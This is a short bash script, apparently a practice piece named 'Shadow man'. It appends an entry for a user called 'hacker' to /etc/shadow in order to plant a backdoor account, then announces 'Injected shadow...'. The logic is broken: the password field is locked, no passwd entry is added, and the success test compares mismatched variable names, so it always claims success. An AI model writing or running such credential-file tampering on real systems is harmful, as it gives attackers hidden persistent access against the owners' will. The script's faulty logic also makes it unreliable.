#!/bin/bash

echo "Shadow man..."

#mkdir "/home/hacker"
#echo "Created profile..."

SHADOW="ls -l /etc/shadow"
SHADOW_MAN="hacker:!:19218:0:99999:7:::"
echo $SHADOW_MAN >> "/etc/shadow"
new_shadow=$($SHADOW)
if [ "$SHADOW" != "$shadow_new" ]; then
  echo "Injected shadow..."
else 
  echo "Error en las sombras!"
fi

exit 0
